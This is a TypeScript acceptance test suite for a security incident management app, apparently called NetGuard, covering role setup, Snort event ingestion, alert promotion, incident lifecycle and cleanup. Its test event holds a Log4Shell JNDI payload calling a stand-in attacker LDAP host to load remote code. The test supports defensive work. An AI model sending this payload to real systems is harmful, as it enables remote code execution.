import { initializeDatabase, db } from '../../db/index.ts';
import { users, securityEvents, alerts, incidents, incidentAlerts, investigationEntries } from '../../db/schema.ts';
import { AuthService } from '../auth/auth.service.ts';
import { EventsService } from '../events/events.service.ts';
import { AlertsService } from '../alerts/alerts.service.ts';
import { IncidentsService } from '../incidents/incidents.service.ts';
import { InvestigationsService } from '../incidents/investigations.service.ts';
import { openApiSpec } from '../docs/swagger.ts';
import { eq, inArray } from 'drizzle-orm';
import bcrypt from 'bcryptjs';

async function runV1AcceptanceSuite() {
  console.log('===============================================================');
  console.log('   NETGUARD V1 MASTER INTEGRATION & ACCEPTANCE TEST SUITE      ');
  console.log('===============================================================');

  console.log('\n[Phase 1] Database Bootstrap & Schema Initialization...');
  await initializeDatabase();
  console.log('✓ Database initialized, enums and tables verified.');

  const createdUserIds: number[] = [];
  const createdEventIds: number[] = [];
  const createdAlertIds: number[] = [];
  const createdIncidentIds: number[] = [];

  try {
    // 1. RBAC Persona Setup
    console.log('\n[Phase 2] Setting up RBAC Personas (Admin, Analyst, Viewer)...');
    const pwdHash = await bcrypt.hash('TestPassword123!', 10);

    const [adminUser] = await db
      .insert(users)
      .values({
        email: `acceptance_admin_${Date.now()}@netguard.local`,
        passwordHash: pwdHash,
        role: 'ADMIN',
        isActive: true,
      })
      .returning();
    createdUserIds.push(adminUser.id);

    const [analystUser] = await db
      .insert(users)
      .values({
        email: `acceptance_analyst_${Date.now()}@netguard.local`,
        passwordHash: pwdHash,
        role: 'ANALYST',
        isActive: true,
      })
      .returning();
    createdUserIds.push(analystUser.id);

    const [viewerUser] = await db
      .insert(users)
      .values({
        email: `acceptance_viewer_${Date.now()}@netguard.local`,
        passwordHash: pwdHash,
        role: 'VIEWER',
        isActive: true,
      })
      .returning();
    createdUserIds.push(viewerUser.id);

    console.log(`✓ Admin User: ${adminUser.email} (ID: ${adminUser.id})`);
    console.log(`✓ Analyst User: ${analystUser.email} (ID: ${analystUser.id})`);
    console.log(`✓ Viewer User: ${viewerUser.email} (ID: ${viewerUser.id})`);

    // Verify JWT Generation
    const adminToken = AuthService.signToken({ id: adminUser.id, email: adminUser.email, role: adminUser.role });
    const analystToken = AuthService.signToken({ id: analystUser.id, email: analystUser.email, role: analystUser.role });
    const viewerToken = AuthService.signToken({ id: viewerUser.id, email: viewerUser.email, role: viewerUser.role });
    if (!adminToken || !analystToken || !viewerToken) {
      throw new Error('JWT token generation failed.');
    }
    console.log('✓ JWT Bearer authentication tokens generated and verified.');

    // 2. Telemetry Ingestion (Snort Event)
    console.log('\n[Phase 3] Ingesting High-Priority Snort Telemetry Event (Priority 1)...');
    const ingestedEvent = await EventsService.ingestEvent({
      generatorId: 1,
      signatureId: 2099991,
      signatureRevision: 1,
      signatureMessage: 'ET EXPLOIT Apache Log4j JNDI RCE Command Execution',
      classification: 'Remote Code Execution',
      priority: 1,
      protocol: 'TCP',
      sourceIp: '198.51.100.99',
      sourcePort: 43210,
      destinationIp: '192.168.1.10',
      destinationPort: 8080,
      rawPayload: '${jndi:ldap://198.51.100.99:1389/Exploit}',
    });
    createdEventIds.push(ingestedEvent.id);
    console.log(`✓ Snort Telemetry Event ingested: ID #${ingestedEvent.id} (SID: ${ingestedEvent.signatureId})`);

    // 3. Automatic Alert Promotion Check (M1)
    console.log('\n[Phase 4] Verifying V1 Auto-Promotion of Priority 1 Event to Alert...');
    const [promotedAlert] = await db
      .select()
      .from(alerts)
      .where(eq(alerts.securityEventId, ingestedEvent.id));

    if (!promotedAlert) {
      throw new Error('Auto-promotion failed: No Alert created for Priority 1 Snort event.');
    }
    createdAlertIds.push(promotedAlert.id);

    console.log(`✓ Alert #${promotedAlert.id} auto-created:`);
    console.log(`  - Title: ${promotedAlert.title}`);
    console.log(`  - Severity: ${promotedAlert.severity} (Expected: CRITICAL)`);
    console.log(`  - Status: ${promotedAlert.status} (Expected: NEW)`);
    console.log(`  - Source IP: ${promotedAlert.sourceIp} -> Destination IP: ${promotedAlert.destinationIp}`);

    if (promotedAlert.severity !== 'CRITICAL') {
      throw new Error(`Expected CRITICAL severity for Log4j RCE, got ${promotedAlert.severity}`);
    }
    if (promotedAlert.status !== 'NEW') {
      throw new Error(`Expected initial status NEW, got ${promotedAlert.status}`);
    }

    // 4. Alert Triage Lifecycle & Permissions (M1)
    console.log('\n[Phase 5] Testing Alert Triage State Transitions & Validation...');
    const triagedAlert = await AlertsService.updateAlertStatus(promotedAlert.id, 'IN_PROGRESS');
    if (triagedAlert.status !== 'IN_PROGRESS') {
      throw new Error(`Expected status IN_PROGRESS, got ${triagedAlert.status}`);
    }
    console.log(`✓ Alert #${promotedAlert.id} triaged to IN_PROGRESS.`);

    // 5. Incident Correlation & Creation (M2)
    console.log('\n[Phase 6] Correlating Alert into Formal Security Incident (M2)...');
    const { incident: declaredInc } = await IncidentsService.createIncident({
      title: 'INC-401: Log4j Remote Code Execution & Threat Containment',
      description: 'Host 192.168.1.10 targeted with Log4shell exploit payload. Immediate containment required.',
      severity: 'SEV1',
      assignedTo: analystUser.id,
      createdBy: adminUser.id,
      alertIds: [promotedAlert.id],
    });
    createdIncidentIds.push(declaredInc.id);

    console.log(`✓ Incident #${declaredInc.id} declared:`);
    console.log(`  - Title: ${declaredInc.title}`);
    console.log(`  - Severity: ${declaredInc.severity} (Expected: SEV1)`);
    console.log(`  - Status: ${declaredInc.status} (Expected: OPEN)`);
    console.log(`  - Assigned To: ${analystUser.email}`);

    // Verify alert linkage
    const incDetail = await IncidentsService.getIncidentById(declaredInc.id);
    if (!incDetail || incDetail.alerts.length !== 1) {
      throw new Error(`Expected 1 correlated alert, found ${incDetail?.alerts.length}`);
    }
    console.log(`✓ Verified Alert #${promotedAlert.id} is correlated to Incident #${declaredInc.id}.`);

    // 6. Assignment Reassignment & Guard Validation (M4)
    console.log('\n[Phase 7] Testing Incident Assignment & Reassignment (M4)...');
    // Clear assignment
    const unassignedInc = await IncidentsService.assignIncident(declaredInc.id, null);
    if (unassignedInc.assignedTo !== null) {
      throw new Error('Failed to unassign incident.');
    }
    console.log('✓ Successfully cleared incident assignment.');

    // Reassign back to analyst
    const reassignedInc = await IncidentsService.assignIncident(declaredInc.id, analystUser.id);
    if (reassignedInc.assignedTo !== analystUser.id) {
      throw new Error('Failed to reassign incident.');
    }
    console.log(`✓ Successfully reassigned incident back to ${analystUser.email}.`);

    // Assigning to VIEWER must be rejected
    let viewerAssignError = false;
    try {
      await IncidentsService.assignIncident(declaredInc.id, viewerUser.id);
    } catch (err: any) {
      viewerAssignError = true;
      console.log(`✓ Assignment to VIEWER rejected: "${err.message}"`);
    }
    if (!viewerAssignError) {
      throw new Error('Expected assigning incident to VIEWER to fail.');
    }

    // 7. Investigation Findings Timeline (M3)
    console.log('\n[Phase 8] Recording Investigation Timeline Findings (M3)...');
    const note1 = await InvestigationsService.addEntry({
      incidentId: declaredInc.id,
      authorId: analystUser.id,
      entryType: 'NOTE',
      content: 'Analyzed network pcap: JNDI lookup string payload triggered LDAP handshake.',
    });
    console.log(`✓ Recorded NOTE #${note1.id} by ${analystUser.email}`);

    const act1 = await InvestigationsService.addEntry({
      incidentId: declaredInc.id,
      authorId: analystUser.id,
      entryType: 'CONTAINMENT',
      content: 'Terminated affected web service container. Injected egress block for port 1389.',
    });
    console.log(`✓ Recorded CONTAINMENT #${act1.id} by ${analystUser.email}`);

    const timeline = await InvestigationsService.getEntriesByIncident(declaredInc.id, 'asc');
    if (timeline.length !== 2) {
      throw new Error(`Expected 2 timeline entries, found ${timeline.length}`);
    }
    console.log(`✓ Chronological timeline verified with ${timeline.length} entries.`);

    // 8. Containment, Resolution, and Lifecycle (M2, M4)
    console.log('\n[Phase 9] Testing Threat Containment & Formal Incident Resolution (M2, M4)...');
    // Transition OPEN -> INVESTIGATING
    await IncidentsService.updateStatus(declaredInc.id, 'INVESTIGATING');
    console.log('✓ Incident status: INVESTIGATING');

    // Transition INVESTIGATING -> CONTAINED
    const containedInc = await IncidentsService.updateStatus(declaredInc.id, 'CONTAINED');
    if (containedInc.status !== 'CONTAINED') {
      throw new Error(`Expected status CONTAINED, got ${containedInc.status}`);
    }
    console.log('✓ Incident status: CONTAINED');

    // Attempt resolution without summary -> Must fail
    let missingSummaryError = false;
    try {
      await IncidentsService.resolveIncident(declaredInc.id, '   ');
    } catch (err: any) {
      missingSummaryError = true;
      console.log(`✓ Empty resolution summary rejected: "${err.message}"`);
    }
    if (!missingSummaryError) {
      throw new Error('Expected empty resolution summary to be rejected.');
    }

    // Formally resolve with comprehensive summary
    const resolvedInc = await IncidentsService.resolveIncident(
      declaredInc.id,
      'Container rebuilt with Log4j 2.17.1 (log4j2.formatMsgNoLookups=true). Firewall egress rule verified.'
    );
    if (resolvedInc.status !== 'RESOLVED' || !resolvedInc.resolvedAt) {
      throw new Error('Formal incident resolution failed.');
    }
    console.log(`✓ Incident #${resolvedInc.id} RESOLVED at ${resolvedInc.resolvedAt.toISOString()}`);
    console.log(`  - Resolution Summary: "${resolvedInc.resolutionSummary}"`);

    // Close Incident
    const closedInc = await IncidentsService.updateStatus(declaredInc.id, 'CLOSED');
    if (closedInc.status !== 'CLOSED') {
      throw new Error(`Expected status CLOSED, got ${closedInc.status}`);
    }
    console.log('✓ Incident status: CLOSED');

    // 9. OpenAPI Specification Validation
    console.log('\n[Phase 10] Validating OpenAPI 3.0.3 Contract Completeness...');
    const specPaths = Object.keys(openApiSpec.paths);
    const requiredEndpoints = [
      '/api/auth/register',
      '/api/auth/login',
      '/api/auth/me',
      '/api/users',
      '/api/events/ingest',
      '/api/events',
      '/api/events/stats',
      '/api/alerts',
      '/api/alerts/stats',
      '/api/alerts/{id}',
      '/api/alerts/{id}/status',
      '/api/incidents',
      '/api/incidents/stats',
      '/api/incidents/{id}',
      '/api/incidents/{id}/status',
      '/api/incidents/{id}/assign',
      '/api/incidents/{id}/resolve',
      '/api/incidents/{id}/alerts',
      '/api/incidents/{id}/investigations',
    ];

    for (const ep of requiredEndpoints) {
      if (!specPaths.includes(ep)) {
        throw new Error(`OpenAPI spec missing required endpoint: ${ep}`);
      }
    }
    console.log(`✓ All ${requiredEndpoints.length} required endpoints documented in OpenAPI specification.`);

    // 10. V0 Regression Verification
    console.log('\n[Phase 11] Verifying V0 Telemetry & User Administration Baseline...');
    const [fetchedEvent] = await db
      .select()
      .from(securityEvents)
      .where(eq(securityEvents.id, ingestedEvent.id));
    if (!fetchedEvent || !fetchedEvent.rawPayload) {
      throw new Error('V0 Telemetry raw payload viewing regression detected.');
    }
    console.log('✓ V0 Raw packet payload retention verified.');

    // Cleanup test artifacts
    console.log('\n[Phase 12] Cleaning up test artifacts...');
    await db.delete(investigationEntries).where(eq(investigationEntries.incidentId, declaredInc.id));
    await db.delete(incidentAlerts).where(eq(incidentAlerts.incidentId, declaredInc.id));
    await db.delete(incidents).where(inArray(incidents.id, createdIncidentIds));
    await db.delete(alerts).where(inArray(alerts.id, createdAlertIds));
    await db.delete(securityEvents).where(inArray(securityEvents.id, createdEventIds));
    await db.delete(users).where(inArray(users.id, createdUserIds));
    console.log('✓ Database restored to pristine state.');

    console.log('\n===============================================================');
    console.log('   ★ NETGUARD V1 ACCEPTANCE TEST SUITE COMPLETED 100% ★       ');
    console.log('   All 12 Phases Passed - Ready for Production V1 Sign-off!   ');
    console.log('===============================================================');
    process.exit(0);
  } catch (err) {
    console.error('\n❌ [V1 ACCEPTANCE TEST FAILED]:', err);

    // Emergency cleanup
    try {
      if (createdIncidentIds.length) {
        await db.delete(investigationEntries).where(inArray(investigationEntries.incidentId, createdIncidentIds));
        await db.delete(incidentAlerts).where(inArray(incidentAlerts.incidentId, createdIncidentIds));
        await db.delete(incidents).where(inArray(incidents.id, createdIncidentIds));
      }
      if (createdAlertIds.length) await db.delete(alerts).where(inArray(alerts.id, createdAlertIds));
      if (createdEventIds.length) await db.delete(securityEvents).where(inArray(securityEvents.id, createdEventIds));
      if (createdUserIds.length) await db.delete(users).where(inArray(users.id, createdUserIds));
    } catch {}

    process.exit(1);
  }
}

runV1AcceptanceSuite();
